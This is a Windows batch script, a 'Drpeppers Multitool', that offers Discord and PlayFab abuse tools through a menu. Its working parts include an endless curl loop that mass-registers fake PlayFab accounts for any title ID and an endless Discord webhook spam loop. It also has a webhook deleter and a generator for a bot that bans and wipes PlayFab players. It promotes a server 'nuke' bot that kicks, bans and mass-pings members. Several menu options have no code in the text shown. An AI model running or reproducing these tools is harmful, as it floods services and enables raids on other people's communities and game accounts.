@echo off
mode 185, 50
color 1
chcp 65001 >nul
title Drpeppers Multitool
goto banner
color 0A


:banner
cls
echo.
echo.
echo.
echo 		██████╗ ██████╗ ██████╗      ███╗   ███╗██╗   ██╗██╗  ████████╗██╗   ████████╗ ██████╗  ██████╗ ██╗
echo 		██╔══██╗██╔══██╗██╔══██╗     ████╗ ████║██║   ██║██║  ╚══██╔══╝██║   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
echo 		██║  ██║██████╔╝██████╔╝     ██╔████╔██║██║   ██║██║     ██║   ██║█████╗██║   ██║   ██║██║   ██║██║     
echo 		██║  ██║██╔══██╗██╔═══╝      ██║╚██╔╝██║██║   ██║██║     ██║   ██║╚════╝██║   ██║   ██║██║   ██║██║     
echo 		██████╔╝██║  ██║██║          ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
echo 		╚═════╝ ╚═╝  ╚═╝╚═╝          ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
echo.
echo.
echo.
echo.
echo 			════════════════════════════════════════════════════════════════════════════════════════════════════
echo.
echo                                           1) IP CONFIG                 4) JOIN THE DISCORD!
echo                                           2) OPEN NOTEPAD              5) INVITE THE NUKE BOT!
echo                                           3) PING A WEBSITE/IP         6) EXIT :(
echo 					  7) spam a playfab	       8) create your own personal playfab BOT
echo				  	  	  9) spam a webhook	       10) check if a webhook is valid or not
echo					  	  11) delete a webhook	       12) send a webhook message
echo 					  13) get webhook info	       14) ip lookup
echo					  	  15) phone number lookup      16) port scanner
echo						  17) website status checker   18) DNS lookup
echo					      	  19) server info lookup       20) send a embed webhook msg
echo						  21) send pc info to webhook  22) fake msg box
echo						  23) fake Notification	       24) photon validity check
echo						  25) playfab validity check
echo.
echo 			════════════════════════════════════════════════════════════════════════════════════════════════════

set /p choice="				Choose an option (1-25): "

if "%choice%"=="1" goto ipconfig
if "%choice%"=="2" goto notepad
if "%choice%"=="6" goto exit
if "%choice%"=="3" goto pingcustom
if "%choice%"=="4" goto joindiscord
if "%choice%"=="5" goto invitebot
if "%choice%"=="7" goto spam 
if "%choice%"=="8" goto playfab
if "%choice%"=="9" goto webhook
if "%choice%"=="10" goto webhookcheck
if "%choice%"=="11" goto webhookdelete
if "%choice%"=="12" goto webhooksend
if "%choice%"=="13" goto webhookinfo
if "%choice%"=="14" goto iplookup
if "%choice%"=="15" goto phonenumblookup
if "%choice%"=="16" goto portscanner
if "%choice%"=="17" goto websitechecker
if "%choice%"=="18" goto DNSlookup
if "%choice%"=="19" goto serverinfo
if "%choice%"=="20" goto embedwebhook
if "%choice%"=="21" goto systeminfo
if "%choice%"=="22" goto fakemsgbox
if "%choice%"=="23" goto fakenotification
if "%choice%"=="24" goto photon
if "%choice%"=="25" goto playfabcheck

goto banner

:ipconfig
cls
echo Running IP Configuration...
echo --------------------------------------------
ipconfig
pause
goto banner

:notepad
cls
echo Opening Notepad...
start notepad
pause
goto banner

:pingcustom
cls
set /p target=Enter IP address or website to ping: 
set /p count=How many times would you like to ping it? 
echo.
echo Pinging %target% %count% times...
ping %target% -n %count%
pause
goto banner

:joindiscord
cls
echo Opening Discord invite in your browser...
start https://discord.gg/t3rquXvPMg
pause
goto banner

:invitebot
cls
echo Opening invite link...
start https://discord.com/oauth2/authorize?client_id=1356477205106130964 
echo.
echo.
echo ================= Bot Commands =================
echo $nuke        - Basic command nukes the server
echo $raid        - pings 1k times in the channel its used in
echo $kickall    - kicks all members
echo $kickbots   - kick all bots in server
echo $banall   - Ban all members
echo ===============================================
pause
goto banner

:spam 
cls 
@echo off
setlocal enabledelayedexpansion

set /p TITLEID="Title ID: "

:loop
for /f "delims=" %%i in ('powershell -command "[guid]::NewGuid().ToString()"') do set DEVICEID=%%i

curl -X POST "https://%TITLEID%.playfabapi.com/Client/LoginWithAndroidDeviceID" -H "Content-Type: application/json" -d "{\"TitleId\":\"%TITLEID%\",\"AndroidDeviceId\":\"%DEVICEID%\",\"CreateAccount\":true}"
curl -X POST "https://%TITLEID%.playfabapi.com/Client/LoginWithNintendoSwitchDeviceID" -H "Content-Type: application/json" -d "{\"TitleId\":\"%TITLEID%\",\"NintendoSwitchDeviceId\":\"dfgl\",\"CreateAccount\":true}"
curl -X POST "https://%TITLEID%.playfabapi.com/Client/LoginWithIOSDeviceID" -H "Content-Type: application/json" -d "{\"TitleId\":\"%TITLEID%\",\"DeviceId\":\"fhdg\",\"CreateAccount\":true}"

echo Sent requests with ID: %DEVICEID%
goto loop
pause 
goto banner

:playfab

@echo off
setlocal EnableDelayedExpansion

cls
set /p title_id="title_id: "
set /p secret_key="SecretKey: "
set /p guild_id="guild id: "
set /p bot_token="bot token: "

>playfabbot.py (
echo import discord
echo from discord import app_commands
echo from discord.ext import commands, tasks
echo import json
echo import aiohttp
echo from aiohttp import ClientSession
echo import os
echo from datetime import datetime, timedelta
echo from discord.ext.commands import has_permissions
echo import requests
echo from datetime import datetime
echo.
echo intents = discord.Intents.default(^)
echo intents.message_content = True
echo intents.presences = True
echo intents.members = True
echo.
echo bot = commands.Bot(command_prefix='-', intents=intents^)
echo title_id = "!title_id!"
echo.
echo secret_key = "!secret_key!"
echo.
echo ALLOWED_GUILD = !guild_id!
echo.
echo @bot.event
echo async def on_guild_join(guild^):
echo     if guild.id not in ALLOWED_GUILD:
echo         await guild.leave(^)
echo.
echo async def verify_playfab_credentials(title_id, secret_key^):
echo     headers = {"X-SecretKey": secret_key, "Content-Type": "application/json"}
echo     url = f"https://{title_id}.playfabapi.com/Admin/GetPlayerProfile"
echo     async with aiohttp.ClientSession(^) as session:
echo         async with session.post(url, json={"PlayFabId": "Test"}, headers=headers^) as resp:
echo             if resp.status == 401:
echo                 return False
echo             return True
echo.
echo async def playfab_post(endpoint: str, data: dict^):
echo     headers = {
echo         "Content-Type": "application/json",
echo         "X-SecretKey": secret_key
echo     }
echo     async with ClientSession(^) as session:
echo         async with session.post(f"https://{title_id}.playfabapi.com/{endpoint}", json=data, headers=headers^) as response:
echo             return await response.json(^)
echo.
echo async def playfab_request(user_id, endpoint, payload^):
echo     headers = {"X-SecretKey": secret_key, "Content-Type": "application/json"}
echo     url = f"https://{title_id}.playfabapi.com/{endpoint}"
echo     async with aiohttp.ClientSession(^) as session:
echo         async with session.post(url, json=payload, headers=headers^) as resp:
echo             return await resp.json(^), None
echo.
echo @bot.event
echo async def on_ready(^):
echo     print(f"Logged in as {bot.user}"^)
echo     try:
echo         synced = await bot.tree.sync(^)
echo         print(f"Synced {len(synced)} slash commands."^)
echo     except Exception as e:
echo         print(f"Error syncing commands: {e}"^)
echo.
echo @bot.command(^)
echo @has_permissions(moderate_members=True^)
echo async def ban(ctx, player_id: str, reason: str, length: int^):
echo     payload = {
echo         "Bans": [{
echo             "DurationInHours": length,
echo             "Reason": reason,
echo             "PlayFabId": player_id
echo         }]
echo     }
echo     data, error = await playfab_request(ctx.author.id, "Admin/BanUsers", payload^)
echo     if error:
echo         embed = discord.Embed(title="Error", description=error, color=discord.Color.red(^)^)
echo         await ctx.send(embed=embed^)
echo         return
echo     embed = discord.Embed(title="Player Banned", color=discord.Color.red(^)^)
echo     embed.add_field(name="Player ID", value=f"```{player_id}```", inline=False^)
echo     embed.add_field(name="Reason", value=f"```{reason}```", inline=False^)
echo     embed.add_field(name="Ban Duration", value=f"```{length} hours```", inline=False^)
echo     await ctx.send(embed=embed^)
echo.
echo @bot.tree.command(name="ban", description="Ban a player."^)
echo @app_commands.checks.has_permissions(moderate_members=True^)
echo async def ban_slash(interaction: discord.Interaction, player_id: str, duration: int, reason: str^):
echo     if duration ^<= 0:
echo         embed = discord.Embed(title="Invalid Duration", description="The ban duration must be at least 1 hour.", color=discord.Color.red(^)^)
echo         await interaction.response.send_message(embed=embed, ephemeral=True^)
echo         return
echo     ban_until = (datetime.utcnow(^) + timedelta(hours=duration^)^).strftime("%%Y-%%m-%%dT%%H:%%M:%%SZ"^)
echo     payload = {
echo         "Bans": [{
echo             "PlayFabId": player_id,
echo             "Reason": reason,
echo             "EndDate": ban_until,
echo             "Permanent": False
echo         }]
echo     }
echo     data, error = await playfab_request(interaction.user.id, "Admin/BanUsers", payload^)
echo     if error:
echo         embed = discord.Embed(title="Error", description=error, color=discord.Color.red(^)^)
echo         await interaction.response.send_message(embed=embed, ephemeral=True^)
echo         return
echo     embed = discord.Embed(title="Player Banned", color=discord.Color.red(^)^)
echo     embed.add_field(name="Player ID", value=f"```{player_id}```", inline=False^)
echo     embed.add_field(name="Reason", value=f"```{reason}```", inline=False^)
echo     embed.add_field(name="Ban Duration", value=f"```{duration} hours```", inline=False^)
echo     await interaction.response.send_message(embed=embed^)
echo.
echo @bot.command(^)
echo @has_permissions(moderate_members=True^)
echo async def unban(ctx, player_id: str^):
echo     data, error = await playfab_request(ctx.author.id, "Admin/RevokeAllBansForUser", {"PlayFabId": player_id}^)
echo     if error:
echo         embed = discord.Embed(title="Error", description=error, color=discord.Color.red(^)^)
echo         await ctx.send(embed=embed^)
echo         return
echo     embed = discord.Embed(title="Unban Successful", description=f"Player {player_id} has been unbanned.", color=discord.Color.green(^)^)
echo     await ctx.send(embed=embed^)
echo.
echo @bot.tree.command(name="unban", description="Unban a player."^)
echo @app_commands.checks.has_permissions(moderate_members=True^)
echo async def unban_slash(interaction: discord.Interaction, player_id: str^):
echo     data, error = await playfab_request(interaction.user.id, "Admin/RevokeAllBansForUser", {"PlayFabId": player_id}^)
echo     if error:
echo         embed = discord.Embed(title="Error", description=error, color=discord.Color.red(^)^)
echo         await interaction.response.send_message(embed=embed, ephemeral=True^)
echo         return
echo     embed = discord.Embed(title="Unban Successful", description=f"Player {player_id} has been unbanned.", color=discord.Color.green(^)^)
echo     await interaction.response.send_message(embed=embed^)
echo.
echo @bot.command(^)
echo @has_permissions(moderate_members=True^)
echo async def datawipe(ctx, player_id: str^):
echo     data, error = await playfab_request(ctx.author.id, "Admin/DeletePlayer", {"PlayFabId": player_id}^)
echo     if error:
echo         embed = discord.Embed(title="Error", description=error, color=discord.Color.red(^)^)
echo         await ctx.send(embed=embed^)
echo         return
echo     embed = discord.Embed(title="Data Wiped", description=f"Player {player_id}'s data has been wiped.", color=discord.Color.purple(^)^)
echo     await ctx.send(embed=embed^)
echo.
echo @bot.tree.command(name="datawipe", description="Wipe a player's data."^)
echo @app_commands.checks.has_permissions(moderate_members=True^)
echo async def datawipe_slash(interaction: discord.Interaction, player_id: str^):
echo     data, error = await playfab_request(interaction.user.id, "Admin/DeletePlayer", {"PlayFabId": player_id}^)
echo     if error:
echo         embed = discord.Embed(title="Error", description=error, color=discord.Color.red(^)^)
echo         await interaction.response.send_message(embed=embed, ephemeral=True^)
echo         return
echo     embed = discord.Embed(title="Data Wiped", description=f"Player {player_id}'s data has been wiped.", color=discord.Color.purple(^)^)
echo     await interaction.response.send_message(embed=embed^)
echo.
echo bot.run("!bot_token!"^)
)

echo Python file has been generated as 'playfabbot.py'
pause
goto banner

:webhook
cls
@echo off                                                                                                  
set /p webhook="Add the webhook to spam: "
set /p message="Add the message to spam: "
goto no_delay_spam

:no_delay_spam
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"%message%\"}" %webhook%
echo Message sent (to stop close tab)
goto no_delay_spam

:webhookcheck
cls
@echo off
setlocal EnableDelayedExpansion


set /p webhook= "webhook to check: "

echo Checking webhook validity...
curl -s -o nul -w "%%{http_code}" "%webhook%" > temp.txt
set /p status=<temp.txt
del temp.txt

if "%status%"=="200" (
    echo [SUCCESS] Webhook is valid!
) else (
    echo [ERROR] Invalid webhook! Status code: %status%
)

pause
goto banner

:webhookdelete
cls
@echo off
setlocal EnableDelayedExpansion

set /p webhook="webhook to delete: "

echo Attempting to delete webhook...
curl -X DELETE "%webhook%"

if %errorlevel% equ 0 (
    echo Webhook deleted successfully!
) else (
    echo Failed to delete webhook.
)

pause
goto banner

:webhooksend

@echo off
cls
set /p webhook=Webhook : 
set /p message=Message : 
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%message%\"}" %webhook%
pause
goto banner
:webhookinfo
@echo off
setlocal
cls
set /p WEBHOOK_URL="webhook url: "


powershell -Command "Invoke-RestMethod -Uri '%WEBHOOK_URL%' | ConvertTo-Json -Depth 10"

endlocal
pause
goto banner

:iplookup
@echo off
cls


set /p ip=Enter IP address to look up: 


curl -s http://ip-api.com/json/%ip% > "%temp%\ipdata.json"


set "psfile=%temp%\iplocator.ps1"
(
echo $d = Get-Content '%temp%\ipdata.json' ^| ConvertFrom-Json
echo Write-Output "IP: $($d.query)"
echo Write-Output "Country: $($d.country)"
echo Write-Output "Region: $($d.regionName)"
echo Write-Output "City: $($d.city)"
echo Write-Output "ISP: $($d.isp)"
echo Write-Output "Org: $($d.org)"
) > "%psfile%"


powershell -NoProfile -ExecutionPolicy Bypass -File "%psfile%"


del "%psfile%"
del "%temp%\ipdata.json"
pause
goto banner
:phonenumblookup
@echo off
setlocal enabledelayedexpansion
cls
set /p phone="Enter phone number: "
set area=!phone:~0,3!
if "!area!"=="201" echo Likely location: New Jersey & goto end
if "!area!"=="202" echo Likely location: Washington, DC & goto end
if "!area!"=="203" echo Likely location: Connecticut & goto end
if "!area!"=="204" echo Likely location: Manitoba, Canada & goto end
if "!area!"=="205" echo Likely location: Alabama & goto end
if "!area!"=="206" echo Likely location: Seattle, WA & goto end
if "!area!"=="207" echo Likely location: Maine & goto end
if "!area!"=="208" echo Likely location: Idaho & goto end
if "!area!"=="209" echo Likely location: California & goto end
if "!area!"=="210" echo Likely location: San Antonio, TX & goto end
if "!area!"=="212" echo Likely location: New York, NY & goto end
if "!area!"=="213" echo Likely location: Los Angeles, CA & goto end
if "!area!"=="214" echo Likely location: Dallas, TX & goto end
if "!area!"=="215" echo Likely location: Philadelphia, PA & goto end
if "!area!"=="216" echo Likely location: Cleveland, OH & goto end
if "!area!"=="217" echo Likely location: Illinois & goto end
if "!area!"=="218" echo Likely location: Minnesota & goto end
if "!area!"=="219" echo Likely location: Indiana & goto end
if "!area!"=="224" echo Likely location: Illinois & goto end
if "!area!"=="225" echo Likely location: Louisiana & goto end
if "!area!"=="228" echo Likely location: Mississippi & goto end
if "!area!"=="229" echo Likely location: Georgia & goto end
if "!area!"=="231" echo Likely location: Michigan & goto end
if "!area!"=="234" echo Likely location: Ohio & goto end
if "!area!"=="239" echo Likely location: Florida & goto end
if "!area!"=="240" echo Likely location: Maryland & goto end
if "!area!"=="248" echo Likely location: Michigan & goto end
if "!area!"=="250" echo Likely location: British Columbia, Canada & goto end
if "!area!"=="251" echo Likely location: Alabama & goto end
if "!area!"=="252" echo Likely location: North Carolina & goto end
if "!area!"=="253" echo Likely location: Washington & goto end
if "!area!"=="254" echo Likely location: Texas & goto end
if "!area!"=="256" echo Likely location: Alabama & goto end
if "!area!"=="260" echo Likely location: Indiana & goto end
if "!area!"=="262" echo Likely location: Wisconsin & goto end
if "!area!"=="267" echo Likely location: Philadelphia, PA & goto end
if "!area!"=="269" echo Likely location: Michigan & goto end
if "!area!"=="270" echo Likely location: Kentucky & goto end
if "!area!"=="276" echo Likely location: Virginia & goto end
if "!area!"=="281" echo Likely location: Houston, TX & goto end
if "!area!"=="289" echo Likely location: Ontario, Canada & goto end
if "!area!"=="301" echo Likely location: Maryland & goto end
if "!area!"=="302" echo Likely location: Delaware & goto end
if "!area!"=="303" echo Likely location: Denver, CO & goto end
if "!area!"=="304" echo Likely location: West Virginia & goto end
if "!area!"=="305" echo Likely location: Miami, FL & goto end
if "!area!"=="306" echo Likely location: Saskatchewan, Canada & goto end
if "!area!"=="307" echo Likely location: Wyoming & goto end
if "!area!"=="308" echo Likely location: Nebraska & goto end
if "!area!"=="309" echo Likely location: Illinois & goto end
if "!area!"=="310" echo Likely location: California & goto end
if "!area!"=="312" echo Likely location: Chicago, IL & goto end
if "!area!"=="313" echo Likely location: Detroit, MI & goto end
if "!area!"=="314" echo Likely location: St. Louis, MO & goto end
if "!area!"=="315" echo Likely location: New York & goto end
if "!area!"=="316" echo Likely location: Kansas & goto end
if "!area!"=="317" echo Likely location: Indiana & goto end
if "!area!"=="318" echo Likely location: Louisiana & goto end
if "!area!"=="319" echo Likely location: Iowa & goto end
if "!area!"=="320" echo Likely location: Minnesota & goto end
if "!area!"=="321" echo Likely location: Florida & goto end
if "!area!"=="323" echo Likely location: Los Angeles, CA & goto end
if "!area!"=="325" echo Likely location: Texas & goto end
if "!area!"=="330" echo Likely location: Ohio & goto end
if "!area!"=="331" echo Likely location: Illinois & goto end
if "!area!"=="334" echo Likely location: Alabama & goto end
if "!area!"=="336" echo Likely location: North Carolina & goto end
if "!area!"=="337" echo Likely location: Louisiana & goto end
if "!area!"=="339" echo Likely location: Massachusetts & goto end
if "!area!"=="347" echo Likely location: New York, NY & goto end
if "!area!"=="351" echo Likely location: Massachusetts & goto end
if "!area!"=="352" echo Likely location: Florida & goto end
if "!area!"=="360" echo Likely location: Washington & goto end
if "!area!"=="361" echo Likely location: Texas & goto end
if "!area!"=="385" echo Likely location: Utah & goto end
if "!area!"=="386" echo Likely location: Florida & goto end
if "!area!"=="401" echo Likely location: Rhode Island & goto end
if "!area!"=="402" echo Likely location: Nebraska & goto end
if "!area!"=="403" echo Likely location: Alberta, Canada & goto end
if "!area!"=="404" echo Likely location: Atlanta, GA & goto end
if "!area!"=="405" echo Likely location: Oklahoma & goto end
if "!area!"=="406" echo Likely location: Montana & goto end
if "!area!"=="407" echo Likely location: Orlando, FL & goto end
if "!area!"=="408" echo Likely location: San Jose, CA & goto end
if "!area!"=="409" echo Likely location: Texas & goto end
if "!area!"=="410" echo Likely location: Maryland & goto end
if "!area!"=="412" echo Likely location: Pittsburgh, PA & goto end
if "!area!"=="413" echo Likely location: Massachusetts & goto end
if "!area!"=="414" echo Likely location: Milwaukee, WI & goto end
if "!area!"=="415" echo Likely location: San Francisco, CA & goto end
if "!area!"=="416" echo Likely location: Toronto, ON & goto end
if "!area!"=="417" echo Likely location: Missouri & goto end
if "!area!"=="418" echo Likely location: Quebec, Canada & goto end
if "!area!"=="419" echo Likely location: Ohio & goto end
if "!area!"=="423" echo Likely location: Tennessee & goto end
if "!area!"=="424" echo Likely location: California & goto end
if "!area!"=="425" echo Likely location: Washington & goto end
if "!area!"=="430" echo Likely location: Texas & goto end
if "!area!"=="432" echo Likely location: Texas & goto end
if "!area!"=="434" echo Likely location: Virginia & goto end
if "!area!"=="435" echo Likely location: Utah & goto end
if "!area!"=="440" echo Likely location: Ohio & goto end
if "!area!"=="442" echo Likely location: California & goto end
if "!area!"=="443" echo Likely location: Maryland & goto end
if "!area!"=="450" echo Likely location: Quebec, Canada & goto end
if "!area!"=="458" echo Likely location: Oregon & goto end
if "!area!"=="469" echo Likely location: Texas & goto end
if "!area!"=="470" echo Likely location: Georgia & goto end
if "!area!"=="475" echo Likely location: Connecticut & goto end
if "!area!"=="478" echo Likely location: Georgia & goto end
if "!area!"=="479" echo Likely location: Arkansas & goto end
if "!area!"=="480" echo Likely location: Arizona & goto end
if "!area!"=="484" echo Likely location: Pennsylvania & goto end
if "!area!"=="501" echo Likely location: Arkansas & goto end
if "!area!"=="502" echo Likely location: Kentucky & goto end
if "!area!"=="503" echo Likely location: Oregon & goto end
if "!area!"=="504" echo Likely location: New Orleans, LA & goto end
if "!area!"=="505" echo Likely location: New Mexico & goto end
if "!area!"=="506" echo Likely location: New Brunswick, Canada & goto end
if "!area!"=="507" echo Likely location: Minnesota & goto end
if "!area!"=="508" echo Likely location: Massachusetts & goto end
if "!area!"=="509" echo Likely location: Washington & goto end
if "!area!"=="510" echo Likely location: Oakland, CA & goto end
if "!area!"=="512" echo Likely location: Austin, TX & goto end
if "!area!"=="513" echo Likely location: Cincinnati, OH & goto end
if "!area!"=="514" echo Likely location: Montreal, QC & goto end
if "!area!"=="515" echo Likely location: Iowa & goto end
if "!area!"=="516" echo Likely location: Long Island, NY & goto end
if "!area!"=="517" echo Likely location: Michigan & goto end
if "!area!"=="518" echo Likely location: New York & goto end
if "!area!"=="519" echo Likely location: Ontario, Canada & goto end
if "!area!"=="520" echo Likely location: Arizona & goto end
if "!area!"=="530" echo Likely location: California & goto end
if "!area!"=="531" echo Likely location: Nebraska & goto end
if "!area!"=="534" echo Likely location: Wisconsin & goto end
if "!area!"=="539" echo Likely location: Oklahoma & goto end
if "!area!"=="540" echo Likely location: Virginia & goto end
if "!area!"=="541" echo Likely location: Oregon & goto end
if "!area!"=="551" echo Likely location: New Jersey & goto end
if "!area!"=="559" echo Likely location: California & goto end
if "!area!"=="561" echo Likely location: Florida & goto end
if "!area!"=="562" echo Likely location: California & goto end
if "!area!"=="563" echo Likely location: Iowa & goto end
if "!area!"=="567" echo Likely location: Ohio & goto end
if "!area!"=="570" echo Likely location: Pennsylvania & goto end
if "!area!"=="571" echo Likely location: Virginia & goto end
if "!area!"=="573" echo Likely location: Missouri & goto end
if "!area!"=="574" echo Likely location: Indiana & goto end
if "!area!"=="580" echo Likely location: Oklahoma & goto end
if "!area!"=="585" echo Likely location: New York & goto end
if "!area!"=="586" echo Likely location: Michigan & goto end
if "!area!"=="601" echo Likely location: Mississippi & goto end
if "!area!"=="602" echo Likely location: Phoenix, AZ & goto end
if "!area!"=="603" echo Likely location: New Hampshire & goto end
if "!area!"=="604" echo Likely location: British Columbia, Canada & goto end
if "!area!"=="605" echo Likely location: South Dakota & goto end
if "!area!"=="606" echo Likely location: Kentucky & goto end
if "!area!"=="607" echo Likely location: New York & goto end
if "!area!"=="608" echo Likely location: Wisconsin & goto end
if "!area!"=="609" echo Likely location: New Jersey & goto end
if "!area!"=="610" echo Likely location: Pennsylvania & goto end
if "!area!"=="612" echo Likely location: Minneapolis, MN & goto end
if "!area!"=="613" echo Likely location: Ontario, Canada & goto end
if "!area!"=="614" echo Likely location: Columbus, OH & goto end
if "!area!"=="615" echo Likely location: Nashville, TN & goto end
if "!area!"=="616" echo Likely location: Michigan & goto end
if "!area!"=="617" echo Likely location: Boston, MA & goto end
if "!area!"=="618" echo Likely location: Illinois & goto end
if "!area!"=="619" echo Likely location: San Diego, CA & goto end
if "!area!"=="620" echo Likely location: Kansas & goto end
if "!area!"=="623" echo Likely location: Arizona & goto end
if "!area!"=="626" echo Likely location: California & goto end
if "!area!"=="628" echo Likely location: California & goto end
if "!area!"=="630" echo Likely location: Illinois & goto end
if "!area!"=="631" echo Likely location: Long Island, NY & goto end
if "!area!"=="636" echo Likely location: Missouri & goto end
if "!area!"=="641" echo Likely location: Iowa & goto end
if "!area!"=="646" echo Likely location: New York, NY & goto end
if "!area!"=="650" echo Likely location: California & goto end
if "!area!"=="651" echo Likely location: Minnesota & goto end
if "!area!"=="657" echo Likely location: California & goto end
if "!area!"=="660" echo Likely location: Missouri & goto end
if "!area!"=="661" echo Likely location: California & goto end
if "!area!"=="662" echo Likely location: Mississippi & goto end
if "!area!"=="678" echo Likely location: Georgia & goto end
if "!area!"=="682" echo Likely location: Texas & goto end
if "!area!"=="701" echo Likely location: North Dakota & goto end
if "!area!"=="702" echo Likely location: Las Vegas, NV & goto end
if "!area!"=="703" echo Likely location: Northern VA & goto end
if "!area!"=="704" echo Likely location: Charlotte, NC & goto end
if "!area!"=="705" echo Likely location: Ontario, Canada & goto end
if "!area!"=="706" echo Likely location: Georgia & goto end
if "!area!"=="707" echo Likely location: California & goto end
if "!area!"=="708" echo Likely location: Illinois & goto end
if "!area!"=="712" echo Likely location: Iowa & goto end
if "!area!"=="713" echo Likely location: Houston, TX & goto end
if "!area!"=="714" echo Likely location: California & goto end
if "!area!"=="715" echo Likely location: Wisconsin & goto end
if "!area!"=="716" echo Likely location: Buffalo, NY & goto end
if "!area!"=="717" echo Likely location: Pennsylvania & goto end
if "!area!"=="718" echo Likely location: New York, NY & goto end
if "!area!"=="719" echo Likely location: Colorado & goto end
if "!area!"=="720" echo Likely location: Colorado & goto end
if "!area!"=="724" echo Likely location: Pennsylvania & goto end
if "!area!"=="727" echo Likely location: Florida & goto end
if "!area!"=="731" echo Likely location: Tennessee & goto end
if "!area!"=="732" echo Likely location: New Jersey & goto end
if "!area!"=="734" echo Likely location: Michigan & goto end
if "!area!"=="737" echo Likely location: Texas & goto end
if "!area!"=="740" echo Likely location: Ohio & goto end
if "!area!"=="754" echo Likely location: Florida & goto end
if "!area!"=="757" echo Likely location: Virginia & goto end
if "!area!"=="760" echo Likely location: California & goto end
if "!area!"=="763" echo Likely location: Minnesota & goto end
if "!area!"=="765" echo Likely location: Indiana & goto end
if "!area!"=="769" echo Likely location: Mississippi & goto end
if "!area!"=="770" echo Likely location: Georgia & goto end
if "!area!"=="772" echo Likely location: Florida & goto end
if "!area!"=="773" echo Likely location: Chicago, IL & goto end
if "!area!"=="774" echo Likely location: Massachusetts & goto end
if "!area!"=="775" echo Likely location: Nevada & goto end
if "!area!"=="778" echo Likely location: British Columbia, Canada & goto end
if "!area!"=="779" echo Likely location: Illinois & goto end
if "!area!"=="780" echo Likely location: Alberta, Canada & goto end
if "!area!"=="781" echo Likely location: Massachusetts & goto end
if "!area!"=="785" echo Likely location: Kansas & goto end
if "!area!"=="786" echo Likely location: Florida & goto end
if "!area!"=="801" echo Likely location: Utah & goto end
if "!area!"=="802" echo Likely location: Vermont & goto end
if "!area!"=="803" echo Likely location: South Carolina & goto end
if "!area!"=="804" echo Likely location: Richmond, VA & goto end
if "!area!"=="805" echo Likely location: California & goto end
if "!area!"=="806" echo Likely location: Texas & goto end
if "!area!"=="808" echo Likely location: Hawaii & goto end
if "!area!"=="810" echo Likely location: Michigan & goto end
if "!area!"=="812" echo Likely location: Indiana & goto end
if "!area!"=="813" echo Likely location: Tampa, FL & goto end
if "!area!"=="814" echo Likely location: Pennsylvania & goto end
if "!area!"=="815" echo Likely location: Illinois & goto end
if "!area!"=="816" echo Likely location: Kansas City, MO & goto end
if "!area!"=="817" echo Likely location: Fort Worth, TX & goto end
if "!area!"=="818" echo Likely location: California & goto end
if "!area!"=="819" echo Likely location: Quebec, Canada & goto end
if "!area!"=="828" echo Likely location: North Carolina & goto end
if "!area!"=="830" echo Likely location: Texas & goto end
if "!area!"=="831" echo Likely location: California & goto end
if "!area!"=="832" echo Likely location: Houston, TX & goto end
if "!area!"=="843" echo Likely location: South Carolina & goto end
if "!area!"=="845" echo Likely location: New York & goto end
if "!area!"=="847" echo Likely location: Illinois & goto end
if "!area!"=="848" echo Likely location: New Jersey & goto end
if "!area!"=="850" echo Likely location: Florida & goto end
if "!area!"=="856" echo Likely location: New Jersey & goto end
if "!area!"=="857" echo Likely location: Massachusetts & goto end
if "!area!"=="858" echo Likely location: California & goto end
if "!area!"=="859" echo Likely location: Kentucky & goto end
if "!area!"=="860" echo Likely location: Connecticut & goto end
if "!area!"=="862" echo Likely location: New Jersey & goto end
if "!area!"=="863" echo Likely location: Florida & goto end
if "!area!"=="864" echo Likely location: South Carolina & goto end
if "!area!"=="865" echo Likely location: Knoxville, TN & goto end
if "!area!"=="867" echo Likely location: Northern Canada & goto end
if "!area!"=="868" echo Likely location: Trinidad and Tobago & goto end
if "!area!"=="869" echo Likely location: Saint Kitts and Nevis & goto end
if "!area!"=="870" echo Likely location: Arkansas & goto end
if "!area!"=="872" echo Likely location: Chicago, IL & goto end
if "!area!"=="878" echo Likely location: Pennsylvania & goto end
if "!area!"=="901" echo Likely location: Memphis, TN & goto end
if "!area!"=="902" echo Likely location: Nova Scotia, Canada & goto end
if "!area!"=="903" echo Likely location: Texas & goto end
if "!area!"=="904" echo Likely location: Jacksonville, FL & goto end
if "!area!"=="905" echo Likely location: Ontario, Canada & goto end
if "!area!"=="906" echo Likely location: Michigan & goto end
if "!area!"=="907" echo Likely location: Alaska & goto end
if "!area!"=="908" echo Likely location: New Jersey & goto end
if "!area!"=="909" echo Likely location: California & goto end
if "!area!"=="910" echo Likely location: North Carolina & goto end
if "!area!"=="912" echo Likely location: Georgia & goto end
if "!area!"=="913" echo Likely location: Kansas & goto end
if "!area!"=="914" echo Likely location: New York & goto end
if "!area!"=="915" echo Likely location: Texas & goto end
if "!area!"=="916" echo Likely location: Sacramento, CA & goto end
if "!area!"=="917" echo Likely location: New York, NY & goto end
if "!area!"=="918" echo Likely location: Oklahoma & goto end
if "!area!"=="919" echo Likely location: Raleigh, NC & goto end
if "!area!"=="920" echo Likely location: Wisconsin & goto end
if "!area!"=="925" echo Likely location: California & goto end
if "!area!"=="928" echo Likely location: Arizona & goto end
if "!area!"=="931" echo Likely location: Tennessee & goto end
if "!area!"=="936" echo Likely location: Texas & goto end
if "!area!"=="937" echo Likely location: Ohio & goto end
if "!area!"=="940" echo Likely location: Texas & goto end
if "!area!"=="941" echo Likely location: Florida & goto end
if "!area!"=="947" echo Likely location: Michigan & goto end
if "!area!"=="949" echo Likely location: California & goto end
if "!area!"=="951" echo Likely location: California & goto end
if "!area!"=="952" echo Likely location: Minnesota & goto end
if "!area!"=="954" echo Likely location: Fort Lauderdale, FL & goto end
if "!area!"=="956" echo Likely location: Texas & goto end
if "!area!"=="970" echo Likely location: Colorado & goto end
if "!area!"=="971" echo Likely location: Oregon & goto end
if "!area!"=="972" echo Likely location: Dallas, TX & goto end
if "!area!"=="973" echo Likely location: New Jersey & goto end
if "!area!"=="975" echo Likely location: Missouri & goto end
if "!area!"=="978" echo Likely location: Massachusetts & goto end
if "!area!"=="979" echo Likely location: Texas & goto end
if "!area!"=="980" echo Likely location: North Carolina & goto end
if "!area!"=="984" echo Likely location: North Carolina & goto end
if "!area!"=="985" echo Likely location: Louisiana & goto end
if "!area!"=="986" echo Likely location: Idaho & goto end
if "!area!"=="989" echo Likely location: Michigan & goto end

:notfound
